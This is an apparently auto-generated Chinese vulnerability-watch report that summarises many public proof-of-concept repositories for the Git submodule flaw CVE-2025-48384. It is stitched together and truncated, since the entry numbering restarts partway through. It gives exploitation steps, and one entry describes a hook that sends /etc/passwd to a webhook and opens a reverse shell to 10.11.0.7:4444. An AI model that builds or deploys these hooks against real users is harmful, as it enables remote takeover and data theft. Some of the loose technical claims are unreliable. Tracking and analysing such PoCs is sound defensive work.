CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

